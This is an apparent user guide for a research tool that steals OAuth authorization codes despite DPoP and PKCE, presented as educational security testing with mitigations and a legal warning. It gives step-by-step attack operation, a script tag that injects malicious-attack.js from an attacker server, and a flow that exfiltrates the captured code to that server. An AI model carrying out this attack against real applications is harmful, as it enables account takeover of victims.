# Portable OAuth DPoP Attack Tool - User Guide

## Overview

This tool demonstrates a browser-swapping attack against OAuth 2.0 with DPoP (Demonstrating Proof of Possession). The attack exploits compromised JavaScript in a victim's browser to steal authorization codes, even when DPoP is properly implemented.

**Key Improvement**: This version is **portable** and can target **any OAuth 2.0/OIDC client application**, not just the example WebClient in this repository.

## Architecture

### Components

1. **AttackerApi** (https://localhost:7666)
   - Standalone attack coordination server
   - Web UI for the attacker to control the attack
   - API endpoints for storing/retrieving stolen credentials

2. **Target Application** (any OAuth client)
   - The legitimate application you're testing
   - Must have compromised JavaScript (victim's browser)

3. **Victim's Browser**
   - Contains malicious JavaScript (`malicious-attack.js`)
   - Polls AttackerApi for stolen DPoP parameters
   - Performs silent OAuth flow and steals authorization code

## Attack Flow

### Step 1: Attacker Initiates OAuth Flow

1. Open the AttackerApi UI at https://localhost:7666
2. Note your **Session ID** (automatically generated)
3. Open the target application in a **new tab/window**
4. Click the "Login" or "Sign In" button to start the OAuth flow
5. You'll be redirected to the authorization server (e.g., `https://localhost:5001/connect/authorize?...`)
6. **Copy the entire URL from the browser address bar**

The URL should contain parameters like:
- `dpop_jkt` - DPoP key thumbprint
- `code_challenge` - PKCE code challenge
- `nonce` - OpenID Connect nonce
- `state` - CSRF protection token
- `client_id`, `redirect_uri`, `scope`, etc.

### Step 2: Extract and Submit Parameters

1. Return to the AttackerApi UI tab
2. Paste the copied authorize URL into the text area
3. Click **"Extract Parameters & Start Attack"**
4. The tool will parse the URL and display all extracted parameters
5. Review the parameters and click **"Submit to Victim"**

At this point:
- The parameters are stored in the AttackerApi
- Any victim browser with the malicious JavaScript will poll the API and receive these parameters

### Step 3: Victim's Browser Performs Silent OAuth

The victim's browser (with `malicious-attack.js` loaded):

1. Polls `https://localhost:7666/api/attack/dpop/latest` every 2 seconds
2. Receives the stolen DPoP parameters
3. Creates a hidden iframe
4. Initiates a silent OAuth flow with:
   - Stolen `dpop_jkt` (attacker's DPoP key thumbprint)
   - Stolen `code_challenge` (attacker's PKCE challenge)
   - Stolen `nonce` (attacker's nonce)
   - `response_mode=fragment` to keep the code client-side
5. Intercepts the authorization code from the URL fragment
6. Sends the code to AttackerApi via `POST /api/attack/code`

### Step 4: Complete the Attack

Back in the AttackerApi UI:

1. Wait for the status to show **"Authorization code received!"**
2. The tool will auto-populate the callback URL (or you can paste it manually)
3. Click **"Complete Flow in New Tab"**
4. A new tab opens with the OAuth callback URL containing the stolen code
5. The target application completes the token exchange using:
   - The stolen authorization code
   - The attacker's `code_verifier` (matching the `code_challenge`)
   - The attacker's DPoP key (matching the `dpop_jkt`)

**Result**: The attacker is now logged in as the victim!

## Why This Attack Works

### DPoP Doesn't Prevent This

1. **DPoP binds tokens to keys, not authorization codes**
   - The `dpop_jkt` in the authorize request is just a hint
   - The authorization server doesn't validate it until token exchange

2. **PKCE doesn't prevent browser swapping**
   - The attacker generates both `code_challenge` and `code_verifier`
   - The victim's browser uses the attacker's `code_challenge`
   - The attacker completes the flow with their matching `code_verifier`

3. **response_mode=fragment bypasses server-side validation**
   - The authorization code stays in the URL fragment
   - Malicious JavaScript can read it before the server processes it
   - The legitimate callback handler never sees the code

4. **No session binding**
   - The authorization code isn't bound to the browser session
   - Any client with the code and matching PKCE verifier can use it

## Testing Against Your Own Application

### Prerequisites

1. Start the AttackerApi:
   ```bash
   cd AttackerApi
   dotnet run
   ```

2. Inject the malicious JavaScript into your target application:
   ```html
   <script src="https://localhost:7666/malicious-attack.js"></script>
   ```
   
   Or if testing the example WebClient:
   ```bash
   cd WebClient
   dotnet run
   ```
   Then navigate to https://localhost:5010/Home/Secure (which has the malicious script)

### Running the Attack

1. Open https://localhost:7666 (AttackerApi UI)
2. Open your target application in a new tab
3. Start the OAuth login flow in the target app
4. Copy the authorize URL from the address bar
5. Paste it into the AttackerApi UI
6. Follow the on-screen instructions

### What to Look For

**Success Indicators**:
- ✅ Parameters extracted from authorize URL
- ✅ Victim browser polls and receives parameters
- ✅ Silent OAuth flow completes in hidden iframe
- ✅ Authorization code intercepted and sent to AttackerApi
- ✅ Attacker completes flow with stolen code
- ✅ Attacker gains access to victim's account

**Failure Indicators**:
- ❌ Missing `dpop_jkt` in authorize URL (DPoP not enabled)
- ❌ Victim browser can't access URL fragment (CSP blocking)
- ❌ Authorization code expires before attacker uses it
- ❌ Token endpoint rejects the code (replay detection)

## Mitigations

### Primary Defense: Prevent JavaScript Compromise

1. **Content Security Policy (CSP)**
   ```
   Content-Security-Policy: script-src 'self'; default-src 'self'
   ```

2. **Subresource Integrity (SRI)**
   ```html
   <script src="app.js" integrity="sha384-..." crossorigin="anonymous"></script>
   ```

3. **Regular Security Audits**
   - Review all third-party scripts
   - Monitor for XSS vulnerabilities
   - Use dependency scanning tools

### Additional Defenses

1. **Short Authorization Code Lifetime**
   - Reduce the window for code theft
   - Example: 30 seconds instead of 10 minutes

2. **Device Flow for High-Risk Scenarios**
   - Use OAuth Device Authorization Grant
   - Requires out-of-band confirmation

3. **Step-Up Authentication**
   - Require additional authentication for sensitive operations
   - Even if attacker steals initial session

4. **Session Binding (Experimental)**
   - Bind authorization code to browser session
   - Validate session cookie during token exchange
   - Not part of OAuth 2.0 spec, but can be implemented

## Limitations of This Attack

1. **Requires JavaScript Compromise**
   - Attacker must inject malicious script into victim's browser
   - This is the hardest part of the attack

2. **Timing Window**
   - Authorization code has limited lifetime
   - Victim must authenticate while attacker is waiting

3. **Same Authorization Server**
   - Victim must use the same authorization server as attacker
   - Attacker must have valid credentials for that server

4. **Detectable**
   - Silent OAuth flow in iframe may trigger security warnings
   - Server logs will show unusual authorization patterns
   - Multiple authorization requests from same session

## Comparison with PAR (Pushed Authorization Requests)

PAR **does not prevent** this attack because:

1. The `request_uri` is still visible in the front-channel (browser URL)
2. The victim's browser can reuse the attacker's `request_uri`
3. The `request_uri` contains the attacker's DPoP and PKCE parameters
4. The attack exploits `response_mode=fragment`, which PAR doesn't address

See `PAR_ATTACK_ANALYSIS.md` for detailed analysis.

## Educational Value

This tool demonstrates:

1. **OAuth 2.0 is complex** - Even with modern extensions (DPoP, PKCE, PAR), subtle vulnerabilities exist
2. **Defense in depth is critical** - No single security mechanism is sufficient
3. **JavaScript security matters** - Compromised JS can bypass many OAuth protections
4. **Browser security model** - Understanding same-origin policy, fragments, and iframes is crucial

## Legal and Ethical Considerations

⚠️ **WARNING**: This tool is for **educational and authorized security testing only**.

- Only test applications you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- This tool demonstrates real attack techniques - use responsibly
- Always follow responsible disclosure practices

## References

- [RFC 9449: OAuth 2.0 Demonstrating Proof of Possession (DPoP)](https://datatracker.ietf.org/doc/html/rfc9449)
- [RFC 7636: Proof Key for Code Exchange (PKCE)](https://datatracker.ietf.org/doc/html/rfc7636)
- [RFC 9126: OAuth 2.0 Pushed Authorization Requests (PAR)](https://datatracker.ietf.org/doc/html/rfc9126)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)

## Support

For questions or issues:
1. Check the existing documentation in this repository
2. Review the console logs in browser developer tools
3. Check the AttackerApi server logs
4. Ensure all components are running on the correct ports

## Version History

- **v2.0** - Portable attack tool (this version)
  - Standalone AttackerApi UI
  - Works with any OAuth client
  - Manual parameter extraction
  - Simplified workflow

- **v1.0** - Original demo
  - Coupled to example WebClient
  - Automatic parameter interception
  - Required WebClient-specific pages
